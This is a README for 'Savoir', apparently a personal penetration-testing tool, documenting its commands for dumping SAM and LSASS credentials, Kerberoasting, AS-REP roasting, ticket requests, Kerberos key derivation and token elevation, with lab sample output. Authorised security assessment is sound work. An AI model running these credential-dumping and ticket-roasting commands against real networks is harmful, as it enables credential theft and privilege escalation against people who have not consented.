# Savoir

Savoir is a tool to perform tasks during internal security assessment.
This project help me to understand how some pentest tools works.


## Build

You can build `savoir` for multiple platforms:

```bash
make update
make build
```

The `build` folder contains build for multiple OS and architectures.


## Commands

### sam

```bash
savoir sam local # Windows only
savoir sam hive --sam <path/to/sam> --system <path/to/system>
savoir sam shadowcopies # Windows only
```


### lsass

```bash
savoir lsass process --json # Windows only
savoir lsass minidump --path /path/to/lsass.dmp --json
```

### kerberos


#### Ask a TGT then a TGS

You can also ask a TGS, `savoir` will ask for a `TGT` first

```bash
savoir kerberos asktgs --dc-ip <DC-IP> -d ubh.lab -u dany -p dany -e rc4 -r karen
$krb5tgs$23$*karen$UBH.LAB$ubh.lab/karen*$858129adc693b1a8bb62e50a51b4ffc2$9b2b...
```

You can ask a `TGT` save it to a `kirbi` files then ask for a `TGS`:

```bash
# Ask a TGT and save it to dany.kirbi
savoir kerberos asktgt --dc-ip <DC-IP> -d ubh.lab -u dany -p dany -e rc4 -o dany.kirbi
TGT saved to dany.kirbi.

# Display the TGT
savoir kerberos describe --ticket dany.kirbi
ServiceName              :  krbtgt/ubh.lab
ServiceRealm             :  UBH.LAB
UserName                 :  dany
UserRealm                :  UBH.LAB
StartTime                :  2022-01-22 09:12:55 +0000 UTC
EndTime                  :  2022-01-22 19:12:55 +0000 UTC
RenewTill                :  2022-01-29 09:12:55 +0000 UTC
Flags                    :  forwardable ; proxiable ; renewable ; initial ; pre-authent
KeyType                  :  arcfour-hmac-md5
Base64(key)              :  9CrwY3aAdXdr91h7uGi9qg==

# Ask a TGS using this TGT
savoir kerberos asktgs --dc-ip <DC-IP> -d ubh.lab -t dany.kirbi -e rc4 -r karen
$krb5tgs$23$*karen$UBH.LAB$ubh.lab/karen*$ef59ed1f3fdfddf356dd93823ad8208f$228920...
```


#### Generate Kerberos keys

Note that `RC4` key is the `NTLM` hash `(MD4(UNICODE(password)))`

```bash
savoir kerberos keys --password 'Pa$$w0rd' --salt 'CONTOSO.COMAdministrator'
arcfour-hmac-md5
  Key: 92937945b518814341de3f726500d4ff
  Iterations: 00001000

aes128-cts-hmac-sha1-96
  Key: bd75e98362b16649ffbaed630d5341d0
  Iterations: 00001000

aes256-cts-hmac-sha1-96
  Key: 660e61042b190b5724c62bb473facca12058fb9ad3c03c0d2809f839c0352502
  Iterations: 00001000
```


#### AS-REP roasting 

A User account may have the option `Do not require Kerberos preauthentication`
checked.

```bash
savoir kerberos asktgt --dc-ip <DOMAIN_IP> -d <DOMAIN> -u <USERNAME> -p <USER_PASSWORD> -e rc4 --format=john
```


#### Kerberoasing

```bash
savoir kerberos asktgs --dc-ip <DOMAIN_IP> -d <DOMAIN> -u <USERNAME> -p <USER_PASSWORD> -e rc4 -r <TARGET_USER>
```


### token

```bash
savoir token elevate -x cmd.exe # Windows only
```


### webscreenshot

This command take a screenshot of a URL using a headless browser.

```bash
savoir webscreenshot --url {url} --renderer {chrome|chromium|firefox} --renderer-path {path}
```
